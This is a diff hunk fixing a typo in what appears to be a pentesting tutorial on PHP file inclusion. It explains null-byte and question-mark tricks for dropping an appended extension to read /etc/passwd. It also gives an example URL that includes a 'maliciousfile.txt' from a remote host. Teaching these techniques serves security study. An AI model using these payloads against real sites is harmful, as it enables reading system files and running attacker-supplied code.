@@ -61,7 +61,7 @@ If the include looks like this:
 
 The php i added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the **.php** will not be taken into account. So we add **%00** to the end of our attackstring.
 
-As noted above this wll only work for php below 5.3. So another way to deal with it is just to add a question mark.This way the stuff after gets interpreted as a paramter and therefore excluded.
+As noted above this will only work for php below 5.3. So another way to deal with it is just to add a question mark.This way the stuff after gets interpreted as a paramter and therefore excluded.
 
 `http://example.com/page=http://192.168.1.101/maliciousfile.txt?`
 
